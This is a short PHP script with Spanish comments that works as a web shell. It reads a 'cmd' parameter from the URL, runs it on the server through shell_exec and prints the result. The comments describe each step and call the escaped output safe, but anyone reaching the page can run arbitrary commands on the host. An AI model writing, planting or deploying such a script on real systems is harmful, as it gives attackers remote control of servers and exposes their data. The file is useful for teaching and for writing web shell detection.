<?php
// Comprobamos si el parámetro 'cmd' está presente en la URL
if(isset($_GET['cmd'])) {
    // Obtenemos el comando de la URL
    $cmd = $_GET['cmd'];

    // Ejecutamos el comando y mostramos el resultado
    echo "<pre>";
    $output = shell_exec($cmd); // Ejecuta el comando en el servidor
    echo htmlspecialchars($output); // Muestra el resultado de forma segura
    echo "</pre>";
} else {
    echo "No command provided.";
}
?>
